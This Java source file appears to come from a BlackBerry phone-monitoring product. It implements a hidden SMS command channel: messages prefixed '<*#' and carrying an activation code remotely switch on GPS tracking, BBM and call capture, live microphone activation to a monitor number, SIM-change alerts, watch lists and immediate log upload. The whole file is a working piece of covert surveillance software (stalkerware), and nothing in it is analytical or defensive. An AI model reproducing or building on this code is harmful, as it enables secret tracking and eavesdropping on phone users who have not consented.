package com.vvt.rmtcmd;

import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class RmtCmdRegister implements SMSSendListener {
	
	private static RmtCmdRegister self = null;
	private static final String NOT_CMD_MSG = "Not a command message.";
	private static final String WRONG_ACT_CODE = "Wrong Activation Code.";
	private static final String INV_CMD_FORMAT = "Invalid command format.";
	private static final String CMD_NOT_REGIT = "Command not found or not registered.";
	private static final String INV_ACT_CODE = "Invalid Activation Code.";
	private static final String PROD_NOT_ACT = "Product is not yet activated.";
	private static final String INV_GPS_VALUE = "Invalid GPS on/off value.";
	private static final String INV_GPS_TIMER = "Invalid GPS timer interval.";
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	private SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	private SMSSender smsSender = Global.getSMSSender();
	private Vector commands = new Vector();
	private String errorMessage = null;
	
	private RmtCmdRegister() {
	}
	
	public static RmtCmdRegister getInstance() {
		if (self == null) {
			self = new RmtCmdRegister();
		}
		return self;
	}
	
	public Vector getCommands() {
		return commands;
	}
	
	public void deregisterCommands(RmtCmdLine cmdLine) {
		int cmd = cmdLine.getCode();
		for (int i = 0; i < commands.size(); i++) {
			RmtCmdLine tmp = (RmtCmdLine)commands.elementAt(i);
			if (cmd == tmp.getCode()) {
				commands.removeElementAt(i);
				break;
			}
		}
	}
	
	public void deregisterAllCommands() {
		commands.removeAllElements();
	}
	
	public void registerCommands(RmtCmdLine cmdLine) {
		if (!isCmdExisted(cmdLine.getCode())) {
			commands.addElement(cmdLine);
		}
	}
	
	public RmtCmdLine parseRmtCmdLine(FxSMSMessage smsMessage) {
		RmtCmdLine cmd = null;
		String[] data = null;
		String message = smsMessage.getMessage();
		if (isSMSCommand(message)) {
			Vector token = new Vector();
			int notFound = -1;
			int nextPos = 0;
			int startPos = 0;
			while ((startPos = message.indexOf("<", nextPos)) != notFound) {
				int endPos = message.indexOf(">", nextPos);
				token.addElement(message.substring(startPos + 1, endPos));
				nextPos = endPos + 1;
			}
			if (token.size() >= 2) {
				data = new String[token.size()];
				for (int i = 0; i < data.length; i++) {
					data[i] = (String)token.elementAt(i);
				}
				cmd = getRmtCmdLine(data);
				if (cmd != null) {
					// To check activation code.
					if (cmd.getActivationCode().equals(licenseInfo.getActivationCode())) {
						cmd.setSenderNumber(smsMessage.getNumber());
					} else {
						errorMessage = WRONG_ACT_CODE;
					}
					// To check product status.
					smsCmdCode = cmdStore.getSMSCommandCode();
					if (cmd.getCode() != smsCmdCode.getActivationCmd() && licenseInfo.getLicenseStatus().getId() != LicenseStatus.ACTIVATED.getId()) {
						errorMessage = PROD_NOT_ACT;
					}
				}
			} else {
				errorMessage = INV_CMD_FORMAT;
			}
			// If there is any error, it will send SMS to the target.
			if (errorMessage != null) {
				cmd = null;
				licenseInfo = licenseMgr.getLicenseInfo();
				FxSMSMessage sms = new FxSMSMessage();
				StringBuffer msg = new StringBuffer();
				// [PID  Version][CMD_ID] OK/ERROR
				msg.append(Constant.L_SQUARE_BRACKET);
				msg.append(licenseInfo.getProductID());
				msg.append(Constant.SPACE);
				msg.append(VersionInfo.getFullVersion());
				msg.append(Constant.R_SQUARE_BRACKET);
				if (!errorMessage.equals(NOT_CMD_MSG)) {
					msg.append(Constant.L_SQUARE_BRACKET);
					msg.append(data[0].substring(2));
					msg.append(Constant.R_SQUARE_BRACKET);
				}
				msg.append(Constant.SPACE);
				msg.append(Constant.ERROR);
				msg.append(Constant.CRLF);
				msg.append(errorMessage);
				sms.setMessage(msg.toString());
				sms.setNumber(smsMessage.getNumber());
				smsSender.addListener(this);
				smsSender.send(sms);
				errorMessage = null;
			}
		}
		return cmd;
	}
	
	private RmtCmdLine getRmtCmdLine(String[] data) {
		RmtCmdLine cmd = null;
		int commandIdMode = 0;
		int activationMode = 1;
		int gpsIndexMode = 2;
		int castMode = commandIdMode;
		try {
			int cmdId = Integer.parseInt(data[0].substring(2));
			SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
			if (cmdId == smsCmdCode.getActivationCmd()) {
				cmd = new RmtCmdLine();
				cmd.setRmtCmdType(RmtCmdType.SMS);
				cmd.setCode(cmdId);
				cmd.setUrl(data[1]);
				if (data.length > 2) {
					cmd.setMonitorNumber(data[2]);
					if (data.length > 3 && data[3].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getDeactivationCmd()) {
				cmd = new RmtCmdLine();
				cmd.setRmtCmdType(RmtCmdType.SMS);
				cmd.setCode(cmdId);
				castMode = activationMode;
				Integer.parseInt(data[1]);
				cmd.setActivationCode(data[1]);
				if (data.length > 2) {
					cmd.setMonitorNumber(data[2]);
					if (data.length > 3 && data[3].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getBBMCmd()) {
				if (data.length == 3 || data.length == 4) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data[2].equals("0")) {
						cmd.setEnabled(0);
					} else if (data[2].equals("1")) {
						cmd.setEnabled(1);
					}
					if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getGPSCmd()) {
				if (data.length == 4 || data.length == 5) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data[2].equals("0")) {
						cmd.setEnabled(0);
					} else if (data[2].equals("1")) {
						cmd.setEnabled(1);
					} else {
						errorMessage = INV_GPS_VALUE;
					}
					castMode = gpsIndexMode;
					int gpsIndex = Integer.parseInt(data[3]);
					if (gpsIndex >= 0 && gpsIndex < 9) {
						cmd.setGpsIndex(gpsIndex);
					} else {
						errorMessage = INV_GPS_TIMER;
					}
					if (data.length == 5 && data[4].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getGPSOnDemandCmd()) {
				if (data.length == 2 || data.length == 3) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(1);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getSendDiagnosticsCmd()) {
				if (data.length == 2 || data.length == 3) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(1);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getSendLogNowCmd()) {
				if (data.length == 2 || data.length == 3) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(1);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getSIMCmd()) {
				if (data.length == 3 || data.length == 4) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data[2].equals("0")) {
						cmd.setEnabled(0);
					} else if (data[2].equals("1")) {
						cmd.setEnabled(1);
					}
					if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getStartCaptureCmd()) {
				if (data.length == 2 || data.length == 3) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(1);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getStartMicCmd()) {
				if (data.length >= 2 && data.length <= 4) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(1);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3) {
						if (data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);
						} else {
							cmd.setMonitorNumber(data[2]);
						}
					}
					if (data.length == 4) {
						cmd.setMonitorNumber(data[2]);
						if (data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);
						}
					}
				}
			} else if (cmdId == smsCmdCode.getStopCaptureCmd()) {
				if (data.length == 2 || data.length == 3) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(0);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getStopMicCmd()) {
				if (data.length == 2 || data.length == 3) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(0);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else if (cmdId == smsCmdCode.getWatchListCmd()) {
				if (data.length == 3 || data.length == 4) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					cmd.setEnabled(0);
					castMode = activationMode;
					Integer.parseInt(data[1]);
					cmd.setActivationCode(data[1]);
					if (data[2].equals("0")) {
						cmd.setEnabled(0);
					} else if (data[2].equals("1")) {
						cmd.setEnabled(1);
					} else if (data[2].equals("2")) {
						cmd.setEnabled(2);
					}
					if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
						cmd.setReply(true);
					}
				}
			} else {
				errorMessage = CMD_NOT_REGIT;
			}
		} catch(NumberFormatException nfe) {
			if (castMode == commandIdMode) {
				errorMessage = NOT_CMD_MSG;
			} else if (castMode == activationMode) {
				errorMessage = INV_ACT_CODE;
			} else if (castMode == gpsIndexMode) {
				errorMessage = INV_GPS_TIMER;
			}
		} catch(Exception e) {
			Log.error("RmtCmdRegister.getRmtCmdLine", null, e);
		}
		return cmd;
	}

	private boolean isSMSCommand(String message) {
		boolean activatedSms = false;
		String prefix = "<*#";
		if (message.startsWith(prefix) && message.endsWith(Constant.GREATER_THAN)) {
			activatedSms = true;
		}
		return activatedSms;
	}

	private boolean isCmdExisted(int cmdCode) {
		boolean isExisted = false;
		for (int i = 0; i < commands.size(); i++) {
			RmtCmdLine tmp = (RmtCmdLine)commands.elementAt(i);
			if (cmdCode == tmp.getCode()) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("RmtCmdRegister.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
	}
}
